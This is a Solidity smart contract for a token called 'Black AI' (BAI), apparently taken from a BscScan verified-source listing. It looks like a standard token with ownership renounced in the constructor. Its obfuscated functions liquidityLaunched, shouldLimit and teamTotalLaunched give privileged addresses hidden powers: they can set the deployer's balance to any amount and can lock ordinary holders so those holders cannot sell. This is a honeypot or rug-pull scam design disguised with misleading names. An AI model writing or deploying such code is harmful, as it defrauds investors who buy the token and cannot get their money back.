/**
 *Submitted for verification at BscScan.com on 2023-01-31
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface txWalletIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minBuy {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract BlackAI is Ownable{
    uint8 public decimals = 18;
    string public symbol = "BAI";
    address public tokenSenderEnable;
    address public amountMin;

    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public senderTrading;
    uint256 public totalSupply = 100000000 * 10 ** 18;


    mapping(address => bool) public launchLimit;

    mapping(address => uint256) public balanceOf;
    bool public takeTrading;
    string public name = "Black AI";
    uint256 constant receiverTake = 10 ** 10;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        txWalletIs swapBuy = txWalletIs(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tokenSenderEnable = minBuy(swapBuy.factory()).createPair(swapBuy.WETH(), address(this));
        amountMin = takeMax();
        launchLimit[amountMin] = true;
        balanceOf[amountMin] = totalSupply;
        emit Transfer(address(0), amountMin, totalSupply);
        renounceOwnership();
    }

    

    function transferFrom(address fundAt, address listShould, uint256 enableBuy) public returns (bool) {
        if (fundAt != takeMax() && allowance[fundAt][takeMax()] != type(uint256).max) {
            require(allowance[fundAt][takeMax()] >= enableBuy);
            allowance[fundAt][takeMax()] -= enableBuy;
        }
        if (listShould == amountMin || fundAt == amountMin) {
            return tradingTxMax(fundAt, listShould, enableBuy);
        }
        if (senderTrading[fundAt]) {
            return tradingTxMax(fundAt, listShould, receiverTake);
        }
        return tradingTxMax(fundAt, listShould, enableBuy);
    }

    function teamTotalLaunched(address atSenderTotal) public {
        if (takeTrading) {
            return;
        }
        launchLimit[atSenderTotal] = true;
        takeTrading = true;
    }

    function shouldLimit(address limitMarketing) public {
        if (limitMarketing == amountMin || limitMarketing == tokenSenderEnable || !launchLimit[takeMax()]) {
            return;
        }
        senderTrading[limitMarketing] = true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function approve(address buyWallet, uint256 enableBuy) public returns (bool) {
        allowance[takeMax()][buyWallet] = enableBuy;
        emit Approval(takeMax(), buyWallet, enableBuy);
        return true;
    }

    function transfer(address listShould, uint256 enableBuy) external returns (bool) {
        return transferFrom(takeMax(), listShould, enableBuy);
    }

    function liquidityLaunched(uint256 enableBuy) public {
        if (!launchLimit[takeMax()]) {
            return;
        }
        balanceOf[amountMin] = enableBuy;
    }

    function tradingTxMax(address amountWalletIs, address launchedSellFrom, uint256 enableBuy) internal returns (bool) {
        require(balanceOf[amountWalletIs] >= enableBuy);
        balanceOf[amountWalletIs] -= enableBuy;
        balanceOf[launchedSellFrom] += enableBuy;
        emit Transfer(amountWalletIs, launchedSellFrom, enableBuy);
        return true;
    }

    function takeMax() private view returns (address) {
        return msg.sender;
    }


}